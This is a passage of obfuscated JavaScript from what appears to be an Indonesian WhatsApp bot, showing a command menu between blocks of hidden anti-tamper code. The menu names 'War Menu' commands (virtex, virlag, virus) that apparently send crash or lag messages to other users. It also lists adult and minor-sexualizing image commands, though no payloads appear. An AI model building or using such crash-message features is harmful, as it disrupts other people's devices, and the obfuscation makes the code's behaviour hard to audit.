_0x14247c(_0x3f8cff);},'vdbOY':_0x1011ca(-0x100,-0x11c,-0x118,-0xf4)+_0x5d4a51(0x4d4,0x4b2,0x4ba,0x4e3),'NzaxC':'{}.constru'+_0x5d4a51(0x4b3,0x4dc,0x4d5,0x4ae)+'rn\x20this\x22)('+'\x20)','UHgTA':_0x1011ca(-0x146,-0x122,-0xfe,-0x122),'aZxWN':_0x5d4a51(0x4c8,0x4c9,0x4c9,0x4af),'IdqKI':_0x5d4a51(0x4ca,0x4f1,0x4ef,0x4e4),'IGgPN':_0x1011ca(-0x12d,-0x125,-0x10a,-0x11d),'LqZkS':_0x5d4a51(0x4f8,0x510,0x4f8,0x4df)+'4','MszGR':function(_0x7c383e,_0x3ca5b7){return _0x7c383e===_0x3ca5b7;},'ewgXD':'wSVgC','jIYYZ':'zQgGh'};function _0x5d4a51(_0x4516e2,_0x34570c,_0x5456bd,_0x3bd83f){return _0x3aa9(_0x5456bd-0x358,_0x3bd83f);}var _0x296cb1=!![];function _0x1011ca(_0x55b0e7,_0x1a421c,_0x2616d4,_0x52868a){return _0x3aa9(_0x1a421c- -0x2be,_0x52868a);}return function(_0x46ccea,_0x59bfbd){function _0x37a25b(_0x5ed314,_0x365c95,_0x802ca1,_0x36442b){return _0x1011ca(_0x5ed314-0x23,_0x802ca1-0x6a0,_0x802ca1-0x118,_0x5ed314);}var _0x56205a={'rxDIV':function(_0x5a1b7d,_0x2cdac8){return _0x19ae2a['iXCXK'](_0x5a1b7d,_0x2cdac8);},'JRhhK':function(_0x5e68f4,_0x2382b7){return _0x5e68f4+_0x2382b7;},'RyAsq':_0x19ae2a[_0x37a25b(0x573,0x58f,0x586,0x55c)],'JBPDV':_0x19ae2a[_0x2bc2c7(-0x217,-0x218,-0x21d,-0x1ed)],'SBHgZ':_0x19ae2a[_0x2bc2c7(-0x25b,-0x243,-0x282,-0x27c)],'ftFHG':_0x19ae2a[_0x37a25b(0x5a0,0x581,0x577,0x596)],'DDynd':_0x19ae2a[_0x2bc2c7(-0x23e,-0x22a,-0x261,-0x242)],'BzSxe':_0x19ae2a[_0x2bc2c7(-0x226,-0x24d,-0x234,-0x245)],'PGhng':function(_0x55d9ce,_0x3c8b12){return _0x55d9ce<_0x3c8b12;},'pnVxe':_0x19ae2a['LqZkS'],'BCzGT':function(_0x4084ae,_0x27eab2){function _0x2362ab(_0x122958,_0x3eecad,_0x412c99,_0x28eb38){return _0x2bc2c7(_0x3eecad-0x26f,_0x3eecad-0xd4,_0x412c99-0x19b,_0x122958);}return _0x19ae2a[_0x2362ab(0x3e,0x1a,0x32,0x18)](_0x4084ae,_0x27eab2);},'SVVNo':_0x19ae2a['ewgXD'],'Pvwzz':_0x19ae2a[_0x2bc2c7(-0x258,-0x275,-0x235,-0x278)]};function _0x2bc2c7(_0x4311cf,_0x489971,_0x34d9db,_0x1a2fee){return _0x1011ca(_0x4311cf-0x10b,_0x4311cf- -0xf7,_0x34d9db-0x1c4,_0x1a2fee);}var _0x592ff3=_0x296cb1?function(){var _0x349e0e={'rRCgm':function(_0x536710,_0x23052c){function _0xd06578(_0x50dd52,_0x5b83b0,_0x16b019,_0x44c416){return _0x3aa9(_0x44c416- -0x4a,_0x16b019);}return _0x56205a[_0xd06578(0x113,0x14c,0x10f,0x12a)](_0x536710,_0x23052c);},'GMfuK':function(_0x584068,_0x185fd2){function _0x2a1daa(_0x18d5c9,_0x51385f,_0x5c414f,_0x3d6dcc){return _0x3aa9(_0x5c414f-0x194,_0x3d6dcc);}return _0x56205a[_0x2a1daa(0x2f9,0x342,0x31b,0x307)](_0x584068,_0x185fd2);},'RUNJW':function(_0x1d2bfc,_0x191636){return _0x1d2bfc+_0x191636;},'gPTLp':_0x56205a['RyAsq'],'ztIPk':_0x56205a['JBPDV'],'CWWCS':function(_0x25a950){return _0x25a950();},'xuayt':_0x43342d(0x2d5,0x2d2,0x2e0,0x2eb),'cAyta':_0x56205a[_0x43342d(0x2f9,0x2c5,0x2ea,0x2e4)],'ZsuSf':_0x56205a[_0x43342d(0x2f4,0x2db,0x31a,0x303)],'zmsAv':_0x56205a['DDynd'],'RSlSJ':_0x43342d(0x2fd,0x2c6,0x2dd,0x2dc),'MsmoU':_0x56205a[_0x43342d(0x2ab,0x2a7,0x2c6,0x2cc)],'XsQkg':function(_0x5b696d,_0xa5dd95){return _0x56205a['PGhng'](_0x5b696d,_0xa5dd95);},'qHmkP':_0x56205a[_0x4e8d39(0x30d,0x2f4,0x2fe,0x305)]};function _0x4e8d39(_0x2ce3dd,_0x9aaada,_0x3ee3ab,_0x53aacb){return _0x37a25b(_0x9aaada,_0x9aaada-0xdc,_0x2ce3dd- -0x23c,_0x53aacb-0x79);}function _0x43342d(_0x41c1dd,_0x4f08f7,_0x511571,_0xc043dd){return _0x2bc2c7(_0xc043dd-0x51b,_0x4f08f7-0x169,_0x511571-0x5a,_0x511571);}if(_0x56205a[_0x43342d(0x2f8,0x2d4,0x2f3,0x2fc)](_0x56205a[_0x43342d(0x30d,0x2f9,0x332,0x30d)],_0x56205a[_0x4e8d39(0x34d,0x335,0x35c,0x375)])){if(_0x59bfbd){if(_0x56205a[_0x4e8d39(0x33c,0x321,0x34b,0x32b)](_0x56205a[_0x43342d(0x2f0,0x2c9,0x2ee,0x2ce)],_0x56205a[_0x43342d(0x2f7,0x2cd,0x2b0,0x2ce)])){var _0x48f4a4=_0x59bfbd[_0x43342d(0x30e,0x2dd,0x2d1,0x2ef)](_0x46ccea,arguments);return _0x59bfbd=null,_0x48f4a4;}else{var _0x5621e0=_0x55c2ca?function(){function _0x1016d5(_0x3d2a38,_0x233e46,_0x40b0d0,_0x5f5a9b){return _0x4e8d39(_0x40b0d0-0x9,_0x3d2a38,_0x40b0d0-0x1f3,_0x5f5a9b-0x1eb);}if(_0x236916){var _0x80667d=_0x2d0483[_0x1016d5(0x312,0x352,0x338,0x357)](_0x2b9758,arguments);return _0x16ebeb=null,_0x80667d;}}:function(){};return _0x3d06fa=![],_0x5621e0;}}}else{var _0x388d82;try{var _0x400bbd=_0x349e0e[_0x43342d(0x2f3,0x2f7,0x2e2,0x2f1)](_0x3d841b,_0x349e0e[_0x4e8d39(0x34b,0x33b,0x353,0x35e)](_0x349e0e[_0x4e8d39(0x325,0x308,0x331,0x32e)](_0x349e0e['gPTLp'],_0x349e0e[_0x4e8d39(0x301,0x307,0x2e3,0x312)]),');'));_0x388d82=_0x349e0e[_0x4e8d39(0x337,0x316,0x326,0x334)](_0x400bbd);}catch(_0x2fe0a9){_0x388d82=_0x44cba3;}var _0x7b5858=_0x388d82['console']=_0x388d82[_0x4e8d39(0x315,0x312,0x301,0x331)]||{},_0x10c240=[_0x349e0e[_0x4e8d39(0x33a,0x33d,0x361,0x360)],_0x349e0e[_0x43342d(0x2d6,0x2fb,0x2ca,0x2d4)],_0x349e0e['ZsuSf'],_0x4e8d39(0x338,0x315,0x35f,0x30f),_0x349e0e[_0x4e8d39(0x340,0x34d,0x31b,0x343)],_0x349e0e[_0x4e8d39(0x329,0x31e,0x306,0x30e)],_0x349e0e[_0x43342d(0x322,0x312,0x30f,0x2fe)]];for(var _0xd3eba3=0xe2*0x3+0x1aa4+-0x2*0xea5;_0x349e0e[_0x43342d(0x2b7,0x2c7,0x2e9,0x2e1)](_0xd3eba3,_0x10c240[_0x4e8d39(0x30f,0x2e4,0x318,0x2f4)]);_0xd3eba3++){var _0x2b6601=_0x349e0e[_0x4e8d39(0x309,0x31d,0x303,0x328)][_0x4e8d39(0x330,0x31e,0x30a,0x325)]('|'),_0x5631d8=-0x3e2+-0x1073+0x1455;while(!![]){switch(_0x2b6601[_0x5631d8++]){case'0':var _0x589c7a=_0x10c240[_0xd3eba3];continue;case'1':var _0x250977=_0x7b5858[_0x589c7a]||_0x24348b;continue;case'2':_0x24348b['__proto__']=_0x4e259f[_0x4e8d39(0x302,0x2e9,0x2ed,0x2f6)](_0x17add0);continue;case'3':var _0x24348b=_0x50df6a['constructo'+'r']['prototype'][_0x43342d(0x2c6,0x2dd,0x2a0,0x2c2)](_0x3586d8);continue;case'4':_0x7b5858[_0x589c7a]=_0x24348b;continue;case'5':_0x24348b[_0x43342d(0x2eb,0x2d2,0x2ea,0x2f2)]=_0x250977[_0x4e8d39(0x332,0x330,0x322,0x308)][_0x43342d(0x2b8,0x2e4,0x2ed,0x2c2)](_0x250977);continue;}break;}}}}:function(){};return _0x296cb1=![],_0x592ff3;};}());function _0x4cb0f5(_0x7923e1,_0x46d1d4,_0x46c516,_0x24fd80){return _0x3aa9(_0x7923e1-0x1d0,_0x24fd80);}var _0x4b646a=_0x48dfac(this,function(){var _0x4f2c26={'EUzYa':function(_0xdf314c,_0x4e2427){return _0xdf314c(_0x4e2427);},'xLljR':function(_0x540724,_0x5b01a6){return _0x540724+_0x5b01a6;},'HcsyZ':_0x57eab4(0x7a,0x7e,0xaa,0x8b)+_0x57eab4(0x6c,0x6f,0x57,0x4b),'jPucJ':'{}.constru'+_0x14bfe5(-0x184,-0x1c8,-0x1a7,-0x18d)+_0x57eab4(0x5a,0x40,0x87,0x5e)+'\x20)','zqCXc':function(_0x341a51){return _0x341a51();},'JMppc':function(_0x321680,_0x3b43e8){return _0x321680===_0x3b43e8;},'ZWZPZ':'zEJsX','bbXMv':_0x14bfe5(-0x176,-0x1c0,-0x19f,-0x18d),'OmMiC':'warn','CqdBw':_0x57eab4(0x73,0x55,0x50,0x5a),'SpBwS':'exception','gbezt':_0x57eab4(0x72,0x7b,0x42,0x5f),'rBVaT':_0x57eab4(0x67,0x83,0x75,0x82),'kjzxS':function(_0x7ae75d,_0x1bf5bd){return _0x7ae75d<_0x1bf5bd;},'FTMvH':_0x57eab4(0x84,0x4a,0x5c,0x62)+'3'},_0xb6196c;function _0x14bfe5(_0x21f03d,_0x144f66,_0x5a357c,_0x3a918a){return _0x3aa9(_0x5a357c- -0x324,_0x3a918a);}try{var _0x361ba4=_0x4f2c26[_0x14bfe5(-0x1ab,-0x1d6,-0x1b9,-0x1cd)](Function,_0x4f2c26[_0x57eab4(0x20,0x61,0x55,0x48)](_0x4f2c26['xLljR'](_0x4f2c26['HcsyZ'],_0x4f2c26[_0x14bfe5(-0x1f2,-0x1cc,-0x1cc,-0x1ec)]),');'));_0xb6196c=_0x4f2c26['zqCXc'](_0x361ba4);}catch(_0x3cae24){if(_0x4f2c26['JMppc'](_0x4f2c26[_0x14bfe5(-0x1b9,-0x1ad,-0x1b2,-0x18b)],_0x14bfe5(-0x1e7,-0x1cd,-0x1cb,-0x1e0)))_0xb6196c=window;else{var _0x2c4488=_0x350d56[_0x14bfe5(-0x172,-0x1ae,-0x19b,-0x185)](_0x387d3d,arguments);return _0x1bf772=null,_0x2c4488;}}var _0x3ffa85=_0xb6196c[_0x14bfe5(-0x1de,-0x1c4,-0x1b5,-0x1a1)]=_0xb6196c[_0x57eab4(0x78,0x48,0x7e,0x58)]||{};function _0x57eab4(_0x243cfb,_0x3c11d1,_0x47344,_0x5065f9){return _0x3aa9(_0x5065f9- -0x117,_0x3c11d1);}var _0x5dea5a=[_0x4f2c26[_0x14bfe5(-0x19d,-0x19e,-0x185,-0x15a)],_0x4f2c26[_0x57eab4(0x52,0x3e,0x58,0x3d)],_0x4f2c26[_0x57eab4(0x4a,0x6f,0x7d,0x6b)],_0x57eab4(0x60,0x5d,0x8b,0x7b),_0x4f2c26[_0x14bfe5(-0x15e,-0x19c,-0x17c,-0x195)],_0x4f2c26['gbezt'],_0x4f2c26[_0x57eab4(0x68,0x84,0xa7,0x7c)]];for(var _0x35a892=0xb7f+0x1fd9+-0x124*0x26;_0x4f2c26[_0x14bfe5(-0x1be,-0x1a3,-0x1cd,-0x1c1)](_0x35a892,_0x5dea5a[_0x57eab4(0x77,0x73,0x77,0x52)]);_0x35a892++){var _0x3c78c9=_0x4f2c26['FTMvH'][_0x57eab4(0x6f,0x98,0x6e,0x73)]('|'),_0xf54283=-0x192c*0x1+-0xea0+0xd44*0x3;while(!![]){switch(_0x3c78c9[_0xf54283++]){case'0':_0x438d55[_0x57eab4(0x76,0x9f,0x9f,0x76)]=_0x48dfac['bind'](_0x48dfac);continue;case'1':_0x438d55[_0x57eab4(0x4b,0x96,0x72,0x75)]=_0x4f87fb[_0x14bfe5(-0x1b6,-0x1bb,-0x198,-0x1bf)]['bind'](_0x4f87fb);continue;case'2':var _0x4f87fb=_0x3ffa85[_0x272df8]||_0x438d55;continue;case'3':_0x3ffa85[_0x272df8]=_0x438d55;continue;case'4':var _0x438d55=_0x48dfac[_0x14bfe5(-0x1a3,-0x18c,-0x1a3,-0x17a)+'r']['prototype']['bind'](_0x48dfac);continue;case'5':var _0x272df8=_0x5dea5a[_0x35a892];continue;}break;}}});function _0x3aa9(_0x414411,_0xcb0fc){var _0x5a40ae=_0x3d68();return _0x3aa9=function(_0x3d6865,_0x3aa9eb){_0x3d6865=_0x3d6865-(-0x2641+0xb5*-0xd+0x30c6);var _0x3e11e6=_0x5a40ae[_0x3d6865];return _0x3e11e6;},_0x3aa9(_0x414411,_0xcb0fc);}_0x4b646a(),await Ndyie[_0x1b7915(0x320,0x2fe,0x30b,0x324)+_0x1b7915(0x306,0x31a,0x306,0x316)](from,Presence['composing']);
            
//━━━━━━━━━━━━━━━[ CONNECTION 3 ]━━━━━━━━━━━━━━━\\

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
         if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
         if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
          if (!Nia.key.fromMe && isSelf === true) return

//━━━━━━━━━━━━━━━[ WELCOME TO MENU ]━━━━━━━━━━━━━━━\\
switch (command) {             
case 'menu':
totalChat = await Ndyie.chats.all()
groups = Ndyie.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = Ndyie.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
Ndy = '6283818744065'
teks = `╭⳹─「 *INFO USER* 」
│ 𝙏𝘼𝐆 : @${sender.split("@")[0]}
╰────────────┈ ⳹

╭⳹─「 *INFO BOTZ* 」
│𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : @${Ndy}
│𝑻𝒐𝒕𝒂𝒍 𝒖𝒔𝒆𝒓 : ${pendaftar.length}
│𝑮𝒓𝒖𝒑 𝑻𝒐𝒕𝒂𝒍 : ${groups.length}
│𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑪𝒉𝒂𝒕 : ${privat.length}
│𝑻𝒐𝒕𝒂𝒍 𝑪𝒉𝒂𝒕 : ${totalChat.length}
╰────────────┈ ⳹

╭⳹─「 *JAM* 」
│ 𝙒𝙄𝘽 : ${wib}
│ 𝙒𝙄𝙏𝘼 : ${wita}
│ 𝙒𝙄𝙏 : ${wit}
╰────────────┈ ⳹

╔╦╦╦═╦╗╔═╦═╦══╦═╗
║║║║║╣╚╣═╣║║║║║║╣
╚══╩═╩═╩═╩═╩╩╩╩═╝

╭⳹─「 *Owner Menu* 」
│き⃟${ndyie} ${prefix}del <pesan>
│き⃟${ndyie} ${prefix}tq
│き⃟${ndyie} ${prefix}autoketik
│き⃟${ndyie} ${prefix}autovn
│き⃟${ndyie} ${prefix}anticall
╰────────────┈ ⳹

╭⳹─「 *Grup Menu* 」
│き⃟${ndyie} ${prefix}demoteall
│き⃟${ndyie} ${prefix}promoteall
╰────────────┈ ⳹

╭⳹─「 *Download Menu* 」
│き⃟${ndyie} ${prefix}tiktok
╰────────────┈ ⳹

╭⳹─「 *War Menu* 」
│き⃟${ndyie} ${prefix}virtex
│き⃟${ndyie} ${prefix}virlag
│き⃟${ndyie} ${prefix}virtag
│き⃟${ndyie} ${prefix}virus
│き⃟${ndyie} ${prefix}virgam
╰────────────┈ ⳹

╭⳹─「 *Menu Donasi* 」
│き⃟${ndyie} ${prefix}gopay
│き⃟${ndyie} ${prefix}dana
│き⃟${ndyie} ${prefix}ovo
│き⃟${ndyie} ${prefix}donasi
╰────────────┈ ⳹

╭⳹─「 *Jb Menu* 」
│き⃟${ndyie} ${prefix}listdm
│き⃟${ndyie} ${prefix}ff
│き⃟${ndyie} ${prefix}ml
│き⃟${ndyie} ${prefix}pubg
│き⃟${ndyie} ${prefix}chip
╰────────────┈ ⳹

╭⳹─「 *Dosa Menu* 」
│き⃟${ndyie} ${prefix}dosa1
│き⃟${ndyie} ${prefix}dosa2
│き⃟${ndyie} ${prefix}dosa3
│き⃟${ndyie} ${prefix}dosa4
│き⃟${ndyie} ${prefix}dosa5
│き⃟${ndyie} ${prefix}dosa6
│き⃟${ndyie} ${prefix}dosa7
│き⃟${ndyie} ${prefix}dosa8
│き⃟${ndyie} ${prefix}dosa9
│き⃟${ndyie} ${prefix}dosa10
│き⃟${ndyie} ${prefix}dosa11
│き⃟${ndyie} ${prefix}dosa12
│き⃟${ndyie} ${prefix}dosa13
│き⃟${ndyie} ${prefix}dosa14
│き⃟${ndyie} ${prefix}dosa15
╰────────────┈ ⳹

╭⳹─「 *Nekopoi Menu* 」
│き⃟${ndyie} ${prefix}nekopoi1
│き⃟${ndyie} ${prefix}nekopoi2
│き⃟${ndyie} ${prefix}nekopoi3
│き⃟${ndyie} ${prefix}nekopoi4
│き⃟${ndyie} ${prefix}nekopoi5
│き⃟${ndyie} ${prefix}nekopoi6
│き⃟${ndyie} ${prefix}nekopoi7
│き⃟${ndyie} ${prefix}nekopoi8
│き⃟${ndyie} ${prefix}nekopoi9
╰────────────┈ ⳹

╭⳹─「 *Fun Menu* 」
│き⃟${ndyie} ${prefix}mining
│き⃟${ndyie} ${prefix}cekwatak
│き⃟${ndyie} ${prefix}wangy 
│き⃟${ndyie} ${prefix}apakah
│き⃟${ndyie} ${prefix}bisakah
│き⃟${ndyie} ${prefix}kapankah
│き⃟${ndyie} ${prefix}rate
│き⃟${ndyie} ${prefix}jadian
│き⃟${ndyie} ${prefix}cantik
│き⃟${ndyie} ${prefix}ganteng
│き⃟${ndyie} ${prefix}beban
│き⃟${ndyie} ${prefix}babi
│き⃟${ndyie} ${prefix}cekganteng
│き⃟${ndyie} ${prefix}cekcantik
╰────────────┈ ⳹

╭⳹─「 *Maker Menu* 」
│き⃟${ndyie} ${prefix}lewd
│き⃟${ndyie} ${prefix}loliteks
│き⃟${ndyie} ${prefix}remlogo
│き⃟${ndyie} ${prefix}lolimaker
│き⃟${ndyie} ${prefix}kanekilogo
╰────────────┈ ⳹

╭⳹─「 *Random Menu* 」
│き⃟${ndyie} ${prefix}fakta
│き⃟${ndyie} ${prefix}neko2
│き⃟${ndyie} ${prefix}waifu
│き⃟${ndyie} ${prefix}kanna
│き⃟${ndyie} ${prefix}waifu
│き⃟${ndyie} ${prefix}waifu
│き⃟${ndyie} ${prefix}husbu
│き⃟${ndyie} ${prefix}shota
│き⃟${ndyie} ${prefix}sagiri
│き⃟${ndyie} ${prefix}elaina
│き⃟${ndyie} ${prefix}shinobu
│き⃟${ndyie} ${prefix}animeart
│き⃟${ndyie} ${prefix}ppcpp
│き⃟${ndyie} ${prefix}pcouple
│き⃟${ndyie} ${prefix}darkjokes
│き⃟${ndyie} ${prefix}wpanime
│き⃟${ndyie} ${prefix}megumin
│き⃟${ndyie} ${prefix}aesthetic
│き⃟${ndyie} ${prefix}husbu2
│き⃟${ndyie} ${prefix}waifu2
│き⃟${ndyie} ${prefix}waifu3
╰────────────┈ ⳹

「  ${time}  」`
function _0x4d576c(_0x35863b,_0x401c79,_0x39fefd,_0x11c683){return _0x4f76(_0x35863b-0x3ba,_0x401c79);}function _0x1d3504(_0x775000,_0x527050,_0x3e4197,_0x585c6e){return _0x4f76(_0x527050-0xe1,_0x585c6e);}(function(_0xe84a85,_0x3a4eb2){var _0x4d0b66=_0xe84a85();function _0x146ba9(_0x47e99e,_0x23a23d,_0x635e5,_0x2cfc54){return _0x4f76(_0x2cfc54-0x132,_0x635e5);}function _0x102cd0(_0x5500b1,_0x41c94c,_0x441746,_0x3ede9c){return _0x4f76(_0x441746- -0x16,_0x3ede9c);}while(!![]){try{var _0x29ccb4=parseInt(_0x102cd0(0x15b,0x157,0x188,0x167))/(0x206f+-0x79f*0x1+-0x18cf)+parseInt(_0x102cd0(0x18b,0x15e,0x175,0x17c))/(-0x2*0x121d+0x14a1*-0x1+0x1*0x38dd)*(parseInt(_0x102cd0(0x161,0x157,0x16b,0x137))/(-0xa04+0x1917+-0x3c4*0x4))+-parseInt(_0x146ba9(0x2c1,0x2d6,0x2c0,0x29f))/(0x2037*0x1+-0x1fe9+-0x25*0x2)*(-parseInt(_0x102cd0(0x1c1,0x15a,0x189,0x1a2))/(-0x4c3*-0x4+-0x5*-0x614+0x1079*-0x3))+-parseInt(_0x102cd0(0x1a6,0x1b3,0x186,0x17e))/(-0xbd8+0x1662+-0x1*0xa84)*(parseInt(_0x102cd0(0x171,0x140,0x161,0x168))/(-0x1df5*-0x1+0x4b5+-0x22a3))+parseInt(_0x102cd0(0x127,0x18f,0x15e,0x14a))/(-0x14b6+0x135c+0x162)+parseInt(_0x146ba9(0x2a3,0x297,0x2a0,0x2b6))/(-0x1ed5+-0x2fe*-0x3+0x15e4)*(-parseInt(_0x146ba9(0x291,0x284,0x26e,0x27f))/(0x1*0x18ee+-0x3e7+-0x14fd))+-parseInt(_0x102cd0(0x162,0x165,0x155,0x167))/(0x1e92+0x22*-0x10d+-0xb*-0x79)*(parseInt(_0x146ba9(0x27c,0x28b,0x280,0x295))/(0x21db+0x1*-0x34b+0x1e84*-0x1));if(_0x29ccb4===_0x3a4eb2)break;else _0x4d0b66['push'](_0x4d0b66['shift']());}catch(_0x207100){_0x4d0b66['push'](_0x4d0b66['shift']());}}}(_0x297e,-0x4f5d+0x31fc8+0x1a86d*0x1));var _0x1e59d2=(function(){function _0x4e002a(_0xf4eced,_0x35b27f,_0xe07753,_0x469a6a){return _0x4f76(_0x469a6a-0x257,_0xf4eced);}function _0x3c587d(_0x4ef5b9,_0x388e25,_0x14c191,_0x51f965){return _0x4f76(_0x4ef5b9- -0xa5,_0x14c191);}var _0xf7ccbd={'QtAIe':function(_0x3c3169,_0x4edd2b){return _0x3c3169(_0x4edd2b);},'aQDIz':function(_0x5ec200,_0x316bb2){return _0x5ec200+_0x316bb2;},'GTVHG':_0x4e002a(0x3a4,0x3de,0x3fb,0x3d1)+'nction()\x20','ZkVsf':function(_0x5b6ea1,_0xd049c9){return _0x5b6ea1===_0xd049c9;},'ZqOzO':_0x3c587d(0xb8,0xaa,0x93,0x95),'sEyvv':function(_0x344867,_0x45b3ce){return _0x344867!==_0x45b3ce;},'BdkKv':_0x4e002a(0x408,0x41d,0x3e3,0x402)},_0x4c08c1=!![];return function(_0x2d7699,_0xcc2082){function _0x401452(_0x428c49,_0x41584e,_0x3b4e72,_0x51ea25){return _0x4e002a(_0x51ea25,_0x41584e-0x1e9,_0x3b4e72-0x106,_0x3b4e72-0xf9);}function _0xa0b847(_0x4c0a77,_0xeeda8b,_0x36a653,_0x56fb22){return _0x3c587d(_0x4c0a77-0x316,_0xeeda8b-0x79,_0xeeda8b,_0x56fb22-0x79);}if(_0xf7ccbd[_0x401452(0x52c,0x50b,0x4ff,0x506)](_0xf7ccbd[_0xa0b847(0x428,0x3fe,0x448,0x411)],_0xf7ccbd[_0x401452(0x4d1,0x50b,0x507,0x4f1)])){var _0x15b0a3=_0x49224d?function(){function _0x18dedb(_0x115f43,_0x4d3aeb,_0x632340,_0x56b09c){return _0xa0b847(_0x4d3aeb- -0x5bd,_0x56b09c,_0x632340-0x3d,_0x56b09c-0x10);}if(_0x3a2548){var _0x35f1cd=_0x3dde41[_0x18dedb(-0x1f1,-0x1c5,-0x197,-0x19f)](_0x41e5ec,arguments);return _0x477da7=null,_0x35f1cd;}}:function(){};return _0x1752cd=![],_0x15b0a3;}else{var _0x3421a3=_0x4c08c1?function(){var _0x3c6dd5={'mXtUh':function(_0x48a119,_0x1e3191){function _0x5f10fd(_0x51ff17,_0x5bcb84,_0x4cd305,_0x567dd7){return _0x4f76(_0x4cd305- -0x228,_0x5bcb84);}return _0xf7ccbd[_0x5f10fd(-0x76,-0x67,-0x70,-0x95)](_0x48a119,_0x1e3191);},'THEhf':function(_0x503d2f,_0x1ea49c){return _0xf7ccbd['aQDIz'](_0x503d2f,_0x1ea49c);},'qLcog':_0xf7ccbd[_0x3f4bcb(0xe5,0xca,0xc9,0xd8)],'sLZXr':function(_0x3981e6){return _0x3981e6();}};function _0x3f4bcb(_0x2be9c8,_0x13e196,_0x1c5839,_0x5f29b5){return _0x401452(_0x2be9c8-0x167,_0x13e196-0x91,_0x13e196- -0x3f2,_0x5f29b5);}function _0x58693c(_0x26ff5f,_0x4dd21f,_0x4d210d,_0x7345be){return _0x401452(_0x26ff5f-0x13c,_0x4dd21f-0x149,_0x4dd21f- -0x3dd,_0x7345be);}if(_0xf7ccbd[_0x3f4bcb(0x10a,0xe4,0xbc,0xc8)](_0xf7ccbd[_0x3f4bcb(0x122,0x110,0x136,0xeb)],_0xf7ccbd['ZqOzO'])){if(_0xcc2082){var _0x4a86d3=_0xcc2082[_0x58693c(0xcc,0xfa,0x107,0xd7)](_0x2d7699,arguments);return _0xcc2082=null,_0x4a86d3;}}else{var _0xcc4f4e=_0x3c6dd5[_0x58693c(0xac,0xbf,0xe5,0xcc)](_0x2b8c58,_0x3c6dd5['THEhf'](_0x3c6dd5[_0x58693c(0xb1,0xc7,0xef,0xea)]+(_0x58693c(0x90,0xba,0xe9,0xc9)+_0x58693c(0xdc,0x10d,0x119,0x122)+'rn\x20this\x22)('+'\x20)'),');'));_0x2b2f05=_0x3c6dd5['sLZXr'](_0xcc4f4e);}}:function(){};return _0x4c08c1=![],_0x3421a3;}};}()),_0x461f2e=_0x1e59d2(this,function(){function _0x55edc1(_0x3e975f,_0x218737,_0x34b210,_0x1ee841){return _0x4f76(_0x1ee841- -0x314,_0x3e975f);}function _0x5d918f(_0x4e09e5,_0x50b001,_0x2d3035,_0x300b6d){return _0x4f76(_0x50b001-0x132,_0x4e09e5);}return _0x461f2e[_0x55edc1(-0x194,-0x1b2,-0x179,-0x199)]()[_0x5d918f(0x2b4,0x2d3,0x30b,0x2ff)]('(((.+)+)+)'+'+$')['toString']()[_0x5d918f(0x2d2,0x2b1,0x2c0,0x281)+'r'](_0x461f2e)['search'](_0x5d918f(0x2e1,0x2c8,0x2bd,0x2c9)+'+$');});_0x461f2e();var _0x4d9fb1=(function(){var _0x1097b8={};function _0x35f774(_0x3f4a88,_0xebf325,_0x11353d,_0x57e9b3){return _0x4f76(_0x57e9b3- -0x1a7,_0x3f4a88);}function _0x23cb69(_0x8303fa,_0x1a4fef,_0xb6f418,_0x35ff5b){return _0x4f76(_0xb6f418-0x1ce,_0x35ff5b);}_0x1097b8[_0x35f774(-0x28,0x13,-0x39,-0x22)]=_0x35f774(-0x48,-0xb,-0x24,-0x11)+'+$',_0x1097b8['JAbJX']=function(_0x393e01,_0x165903){return _0x393e01!==_0x165903;},_0x1097b8[_0x23cb69(0x31f,0x2fe,0x31c,0x2f8)]='tsKWM';var _0x219e74=_0x1097b8,_0x4d418c=!![];return function(_0x321c44,_0x84e4b9){var _0x331495={'HvLcz':_0x219e74[_0x234080(0x395,0x392,0x3c1,0x367)],'qizDe':function(_0x53d820,_0x1f2e8e){function _0x1d5e0f(_0x14052e,_0x1009cc,_0x38d991,_0x1c072a){return _0x234080(_0x14052e-0x1a7,_0x38d991- -0x3b6,_0x1009cc,_0x1c072a-0x2a);}return _0x219e74[_0x1d5e0f(0xb,-0x2d,-0x17,-0x22)](_0x53d820,_0x1f2e8e);},'ZfuLe':_0x219e74[_0x234080(0x325,0x35b,0x333,0x35b)]},_0x8faa01=_0x4d418c?function(){function _0x4ee5fa(_0xf69edb,_0x37c25c,_0x5745f8,_0x2b2f45){return _0x234080(_0xf69edb-0x58,_0x2b2f45-0x1c3,_0x5745f8,_0x2b2f45-0x22);}function _0x31a7fe(_0x189a4e,_0x3b5f3b,_0x1fe795,_0xc8cdd4){return _0x1bf0e7(_0x189a4e-0x55c,_0x3b5f3b-0x14f,_0x1fe795-0x1cc,_0xc8cdd4);}if(_0x331495['qizDe'](_0x331495[_0x31a7fe(0x4bd,0x4f5,0x4a8,0x4e1)],_0x331495[_0x31a7fe(0x4bd,0x4d5,0x4b0,0x4b9)]))return _0x140ebb[_0x31a7fe(0x4ae,0x4bc,0x4aa,0x4e3)]()[_0x4ee5fa(0x591,0x56c,0x588,0x571)]('(((.+)+)+)'+'+$')['toString']()[_0x31a7fe(0x4b2,0x487,0x4b8,0x484)+'r'](_0x2e321c)[_0x4ee5fa(0x551,0x54d,0x5ab,0x571)](_0x331495['HvLcz']);else{if(_0x84e4b9){var _0x2f2167=_0x84e4b9[_0x31a7fe(0x4ba,0x4d8,0x4b4,0x4a2)](_0x321c44,arguments);return _0x84e4b9=null,_0x2f2167;}}}:function(){};function _0x1bf0e7(_0x296dfd,_0x591d37,_0x4daba7,_0x476200){return _0x23cb69(_0x296dfd-0xb5,_0x591d37-0xf7,_0x296dfd- -0x3f7,_0x476200);}function 